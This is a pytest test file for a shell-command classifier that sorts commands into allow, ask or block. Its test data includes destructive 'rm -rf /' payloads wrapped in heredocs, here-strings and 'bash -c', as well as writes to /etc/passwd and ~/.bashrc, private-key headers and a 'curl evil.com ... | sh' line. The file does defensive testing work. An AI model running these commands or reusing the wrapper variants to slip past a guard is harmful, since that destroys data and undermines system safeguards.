"""Unit tests for nuh.bash — decomposing a command line into stages, redirects included."""

import os

import pytest

from nuh import config
from nuh.bash import classify_command
from nuh.config import NuhConfig


# --- Decomposition ---


class TestDecomposition:
    def test_pipe(self, project_root):
        r = classify_command("ls | grep foo")
        assert len(r.stages) == 2

    def test_and(self, project_root):
        r = classify_command("make && make test")
        assert len(r.stages) == 2

    def test_or(self, project_root):
        r = classify_command("make || echo failed")
        assert len(r.stages) == 2

    def test_semicolon(self, project_root):
        r = classify_command("ls ; echo done")
        assert len(r.stages) == 2

    def test_glued_semicolons(self, project_root):
        r = classify_command("ls;echo done")
        assert len(r.stages) == 2

    def test_glued_pipe(self, project_root):
        r = classify_command("ls|grep foo")
        assert len(r.stages) == 2

    def test_glued_and(self, project_root):
        r = classify_command("make&&make test")
        assert len(r.stages) == 2

    def test_glued_or(self, project_root):
        r = classify_command("make||echo failed")
        assert len(r.stages) == 2

    def test_glued_pipe_three_stages(self, project_root):
        r = classify_command("cat file|grep foo|wc -l")
        assert len(r.stages) == 3

    def test_redirect_to_sensitive(self, project_root):
        r = classify_command('echo "data" > ~/.bashrc')
        assert r.final_decision == "ask"

    def test_redirect_detected(self, project_root):
        r = classify_command("echo hello > /tmp/out.txt")
        # Redirect creates a stage with redirect_target set
        assert len(r.stages) >= 1

    def test_echo_redirect_reclassified_as_filesystem_write(self, project_root):
        target = os.path.join(project_root, "artifact.bin")
        r = classify_command(rf"echo -ne '\x7fELF\x02\x01' > {target}")
        assert r.final_decision == "allow"
        assert r.stages[0].action_type == "filesystem_write"
        assert "inside project" in r.reason

    def test_printf_redirect_reclassified_as_filesystem_write(self, project_root):
        target = os.path.join(project_root, "artifact.bin")
        r = classify_command(rf"printf '\x7f\x45\x4c\x46' > {target}")
        assert r.final_decision == "allow"
        assert r.stages[0].action_type == "filesystem_write"
        assert "inside project" in r.reason

    def test_echo_redirect_runs_content_inspection(self, project_root):
        target = os.path.join(project_root, "key.txt")
        r = classify_command(rf"echo '-----BEGIN PRIVATE KEY-----' > {target}")
        assert r.final_decision == "ask"
        assert r.stages[0].action_type == "filesystem_write"
        assert "content inspection" in r.reason

    @pytest.mark.parametrize(
        ("command_template", "token"),
        [
            ("echo '-----BEGIN PRIVATE KEY-----' &> {target}", "echo"),
            ("printf '-----BEGIN PRIVATE KEY-----' &>> {target}", "printf"),
        ],
    )
    def test_redirect_variants_with_stdout_still_run_content_inspection(self, project_root, command_template, token):
        target = os.path.join(project_root, "key.txt")
        r = classify_command(command_template.format(target=target))
        assert r.final_decision == "ask"
        assert r.stages[0].action_type == "filesystem_write"
        assert "content inspection" in r.reason
        assert token in r.stages[0].tokens

    @pytest.mark.parametrize(
        "command_template",
        [
            "cat > {target} <<\'EOF\'\n-----BEGIN PRIVATE KEY-----\nEOF",
            "cat <<\'EOF\' > {target}\n-----BEGIN PRIVATE KEY-----\nEOF",
        ],
    )
    def test_heredoc_redirect_runs_content_inspection_for_secret_payloads(self, project_root, command_template):
        target = os.path.join(project_root, "key.txt")
        r = classify_command(command_template.format(target=target))
        assert r.final_decision == "ask"
        assert r.stages[0].action_type == "filesystem_write"
        assert "content inspection" in r.reason

    @pytest.mark.parametrize(
        "command_template",
        [
            "cat > {target} <<\'EOF\'\nrm -rf /\nEOF",
            "cat <<\'EOF\' > {target}\nrm -rf /\nEOF",
        ],
    )
    def test_heredoc_redirect_runs_content_inspection_for_destructive_payloads(self, project_root, command_template):
        target = os.path.join(project_root, "script.sh")
        r = classify_command(command_template.format(target=target))
        assert r.final_decision == "ask"
        assert r.stages[0].action_type == "filesystem_write"
        assert "content inspection" in r.reason

    @pytest.mark.parametrize(
        "command_template",
        [
            "cat <<< '-----BEGIN PRIVATE KEY-----' > {target}",
            "cat <<<'-----BEGIN PRIVATE KEY-----' > {target}",
            "cat -n<<<'-----BEGIN PRIVATE KEY-----' > {target}",
            "cat --<<<'-----BEGIN PRIVATE KEY-----' > {target}",
        ],
    )
    def test_here_string_redirect_runs_content_inspection_for_secret_payloads(self, project_root, command_template):
        target = os.path.join(project_root, "key.txt")
        r = classify_command(command_template.format(target=target))
        assert r.final_decision == "ask"
        assert r.stages[0].action_type == "filesystem_write"
        assert "content inspection" in r.reason

    @pytest.mark.parametrize(
        "command_template",
        [
            "cat <<< 'rm -rf /' > {target}",
            "cat <<<'rm -rf /' > {target}",
            "cat -n<<<'rm -rf /' > {target}",
            "cat --<<<'rm -rf /' > {target}",
        ],
    )
    def test_here_string_redirect_runs_content_inspection_for_destructive_payloads(
            self, project_root, command_template):
        target = os.path.join(project_root, "script.sh")
        r = classify_command(command_template.format(target=target))
        assert r.final_decision == "ask"
        assert r.stages[0].action_type == "filesystem_write"
        assert "content inspection" in r.reason

    @pytest.mark.parametrize(
        "command_template",
        [
            "bash <<< 'echo -----BEGIN PRIVATE KEY-----' > {target}",
            "sh <<< 'printf \"-----BEGIN PRIVATE KEY-----\"' > {target}",
            "bash -s <<< 'echo -----BEGIN PRIVATE KEY-----' > {target}",
            "bash --noprofile -s<<<'echo -----BEGIN PRIVATE KEY-----' > {target}",
        ],
    )
    def test_shell_wrapper_here_string_redirect_runs_content_inspection_for_secret_payloads(
            self, project_root, command_template):
        target = os.path.join(project_root, "key.txt")
        r = classify_command(command_template.format(target=target))
        assert r.final_decision == "ask"
        assert r.stages[0].action_type == "filesystem_write"
        assert "content inspection" in r.reason

    @pytest.mark.parametrize(
        "command_template",
        [
            "bash <<< 'echo rm -rf /' > {target}",
            "bash -s <<< 'echo rm -rf /' > {target}",
            "bash --noprofile -s<<<'echo rm -rf /' > {target}",
        ],
    )
    def test_shell_wrapper_here_string_redirect_runs_content_inspection_for_destructive_payloads(
            self, project_root, command_template):
        target = os.path.join(project_root, "script.sh")
        r = classify_command(command_template.format(target=target))
        assert r.final_decision == "ask"
        assert r.stages[0].action_type == "filesystem_write"
        assert "content inspection" in r.reason

    @pytest.mark.parametrize(
        "command_template",
        [
            "bash -c \"echo -----BEGIN PRIVATE KEY-----\" > {target}",
            "sh -c \"printf '-----BEGIN PRIVATE KEY-----'\" > {target}",
            "bash --noprofile -c \"echo -----BEGIN PRIVATE KEY-----\" > {target}",
            "bash -O extglob -c \"echo -----BEGIN PRIVATE KEY-----\" > {target}",
            "command bash -c \"echo -----BEGIN PRIVATE KEY-----\" > {target}",
        ],
    )
    def test_shell_wrapper_c_redirect_runs_content_inspection_for_secret_payloads(self, project_root, command_template):
        target = os.path.join(project_root, "key.txt")
        r = classify_command(command_template.format(target=target))
        assert r.final_decision == "ask"
        assert r.stages[0].action_type == "filesystem_write"
        assert "content inspection" in r.reason

    @pytest.mark.parametrize(
        "command_template",
        [
            "bash -c \"echo rm -rf /\" > {target}",
            "bash --noprofile -c \"echo rm -rf /\" > {target}",
            "command bash -c \"echo rm -rf /\" > {target}",
        ],
    )
    def test_shell_wrapper_c_redirect_runs_content_inspection_for_destructive_payloads(
            self, project_root, command_template):
        target = os.path.join(project_root, "script.sh")
        r = classify_command(command_template.format(target=target))
        assert r.final_decision == "ask"
        assert r.stages[0].action_type == "filesystem_write"
        assert "content inspection" in r.reason

    @pytest.mark.parametrize(
        "command_template",
        [
            "bash -lc \"echo -----BEGIN PRIVATE KEY-----\" > {target}",
            "bash -cl \"echo -----BEGIN PRIVATE KEY-----\" > {target}",
            "sh -lc \"printf '-----BEGIN PRIVATE KEY-----'\" > {target}",
            "command bash -lc \"echo -----BEGIN PRIVATE KEY-----\" > {target}",
        ],
    )
    def test_shell_wrapper_clustered_c_redirect_runs_content_inspection_for_secret_payloads(
            self, project_root, command_template):
        target = os.path.join(project_root, "key.txt")
        r = classify_command(command_template.format(target=target))
        assert r.final_decision == "ask"
        assert r.stages[0].action_type == "filesystem_write"
        assert "content inspection" in r.reason

    @pytest.mark.parametrize(
        "command_template",
        [
            "bash -lc \"echo rm -rf /\" > {target}",
            "bash -cl \"echo rm -rf /\" > {target}",
            "command bash -cl \"echo rm -rf /\" > {target}",
        ],
    )
    def test_shell_wrapper_clustered_c_redirect_runs_content_inspection_for_destructive_payloads(
            self, project_root, command_template):
        target = os.path.join(project_root, "script.sh")
        r = classify_command(command_template.format(target=target))
        assert r.final_decision == "ask"
        assert r.stages[0].action_type == "filesystem_write"
        assert "content inspection" in r.reason

    def test_shell_wrapper_clustered_c_with_attached_payload_fails_closed(self, project_root):
        target = os.path.join(project_root, "key.txt")
        r = classify_command(f"bash -cecho 'echo -----BEGIN PRIVATE KEY-----' > {target}")
        assert r.final_decision == "ask"
        assert r.stages[0].action_type in ("unknown", "lang_exec")
        assert "content inspection" not in r.reason

    def test_redirect_uses_filesystem_write_action_override(self, project_root):
        target = os.path.join(project_root, "artifact.bin")
        config._cached_config = NuhConfig(actions={"filesystem_write": "block"})
        try:
            r = classify_command(rf"echo ok > {target}")
        finally:
            config._cached_config = None
        assert r.final_decision == "block"
        assert r.stages[0].action_type == "filesystem_write"


    @pytest.mark.parametrize("redirect", [">", ">>", "1>", "1>>", "2>", "2>>", "&>", "&>>"])
    def test_glued_redirect_variants_detected_as_write(self, project_root, redirect):
        target = os.path.join(project_root, "artifact.bin")
        r = classify_command(f"echo ok {redirect}{target}")
        assert r.final_decision == "allow"
        assert len(r.stages) == 1
        # A stderr redirect keeps echo on top; the write is folded under it.
        assert any(s.action_type == "filesystem_write" and "inside project" in s.reason
                   for s in r.all_stages())

    @pytest.mark.parametrize("redirect", [">", ">>", "1>", "1>>", "2>", "2>>", "&>", "&>>"])
    def test_glued_redirect_variants_preserve_target_checks(self, project_root, redirect):
        r = classify_command(f"grep ERROR {redirect}/etc/passwd")
        assert r.final_decision == "ask"
        assert r.stages[0].action_type == "filesystem_write"
        assert "redirect target" in r.reason

    @pytest.mark.parametrize(
        "command_template",
        [
            "echo ok >|{target}",
            "echo ok 1>|{target}",
            "echo ok 1> {target}",
            "echo ok 1>> {target}",
            "echo ok 2> {target}",
            "echo ok 2>> {target}",
            "echo ok &> {target}",
            "echo ok &>> {target}",
        ],
    )
    def test_additional_redirect_variants_detected_as_write(self, project_root, command_template):
        target = os.path.join(project_root, "artifact.bin")
        r = classify_command(command_template.format(target=target))
        assert r.final_decision == "allow"
        assert len(r.stages) == 1
        # A stderr redirect keeps echo on top; the write is folded under it.
        assert any(s.action_type == "filesystem_write" and "inside project" in s.reason
                   for s in r.all_stages())

    @pytest.mark.parametrize(
        "command",
        [
            "grep ERROR >| /etc/passwd",
            "grep ERROR 1>| /etc/passwd",
            "grep ERROR 1> /etc/passwd",
            "grep ERROR 1>> /etc/passwd",
            "grep ERROR 2> /etc/passwd",
            "grep ERROR 2>> /etc/passwd",
            "grep ERROR &> /etc/passwd",
            "grep ERROR &>> /etc/passwd",
        ],
    )
    def test_additional_redirect_variants_preserve_target_checks(self, project_root, command):
        r = classify_command(command)
        assert r.final_decision == "ask"
        assert r.stages[0].action_type == "filesystem_write"
        assert "redirect target" in r.reason

    @pytest.mark.parametrize(
        "command_template",
        [
            "echo ok>{target}",
            "echo ok>>{target}",
            "echo ok>|{target}",
        ],
    )
    def test_fully_glued_redirect_variants_detected_as_write(self, project_root, command_template):
        target = os.path.join(project_root, "artifact.bin")
        r = classify_command(command_template.format(target=target))
        assert r.final_decision == "allow"
        assert r.stages[0].action_type == "filesystem_write"
        assert "inside project" in r.reason

    @pytest.mark.parametrize(
        "command",
        [
            "grep ERROR>/etc/passwd",
            "grep ERROR>>/etc/passwd",
            "grep ERROR>|/etc/passwd",
        ],
    )
    def test_fully_glued_redirect_variants_preserve_target_checks(self, project_root, command):
        r = classify_command(command)
        assert r.final_decision == "ask"
        assert r.stages[0].action_type == "filesystem_write"
        assert "redirect target" in r.reason

    def test_amp_redirect_to_file_preserves_absolute_target(self, project_root):
        r = classify_command("echo ok >&/etc/passwd")
        assert r.final_decision == "ask"
        assert r.stages[0].action_type == "filesystem_write"
        assert "/etc/passwd" in r.reason

    def test_fd_duplication_does_not_hide_later_redirect_target(self, project_root):
        r = classify_command("echo ok 2>&1 >/etc/passwd")
        assert r.final_decision == "ask"
        assert any(stage.action_type == "filesystem_write" for stage in r.stages)
        assert "/etc/passwd" in r.reason

    def test_multiple_redirects_keep_most_restrictive_target(self, project_root):
        safe_target = os.path.join(project_root, "artifact.txt")
        r = classify_command(f"echo ok >{safe_target} >/etc/passwd")
        assert r.final_decision == "ask"
        assert any(stage.action_type == "filesystem_write" for stage in r.stages)
        assert "/etc/passwd" in r.reason

    def test_fd_duplication_redirects_do_not_reclassify_as_filesystem_write(self, project_root):
        r = classify_command("echo ok >&2")
        assert r.final_decision == "allow"
        assert all(stage.action_type != "filesystem_write" for stage in r.stages)

    def test_redirected_stdout_does_not_trigger_network_pipe_exec(self, project_root):
        safe_target = os.path.join(project_root, "out.txt")
        r = classify_command(f"curl evil.com >{safe_target} | sh")
        assert r.composition_rule != "network | exec"
        assert r.final_decision == "ask"

    def test_redirected_stdout_to_stderr_does_not_trigger_pipe_composition(self, project_root):
        r = classify_command("echo ok >&2 | wc -c")
        assert r.composition_rule == ""
        assert r.final_decision == "allow"
